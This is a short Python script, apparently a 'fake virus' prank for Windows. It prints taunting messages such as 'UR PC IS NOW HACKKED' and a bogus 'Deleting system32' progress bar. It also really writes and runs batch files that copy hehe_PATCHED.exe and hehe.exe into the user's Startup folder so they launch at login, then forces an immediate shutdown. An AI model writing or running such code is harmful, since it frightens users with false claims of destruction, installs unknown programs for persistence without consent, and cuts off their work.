import os, time, sys
import pyautogui
def s():
    time.sleep(1)
    os.system('cls')
def scroller(x):
    print(x, end="")
    a = '.....................................'
    for char in a:  
        sys.stdout.write(char)
        sys.stdout.flush()  
        time.sleep(0.06)
    print('Finished')
os.system('color 0A')
os.system('cls')
pyautogui.press('f11')
print("HAHAHAHAH UR PC IS NOW HACKKED!!!!")
print("\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA")
time.sleep(2)
with open('batch.bat', 'w') as f: f.write('''echo off
cls
copy /y hehe_PATCHED.exe "%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup" ''')
os.system('batch.bat')
os.system('cls')
scroller("Deleting system32(its the folder where all critical windows files are stored.)")
time.sleep(1.5)
os.system('cls')
print("Muahahaahhahaahaha")
s()
print("Self destruct in 5")
s()
print("Self destruct in 4")
s()
print('Self destruct in 3')
s()
print('Self destruct in 2')
s()
print('Self destruct in 1')
s()
print('UR PC IS NOW DED!!!')
with open('batch.bat', 'w') as f: f.write('''echo off
cls
copy /y hehe.exe "%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup" ''')
os.system('batch.bat')
time.sleep(3)
os.system('shutdown -p')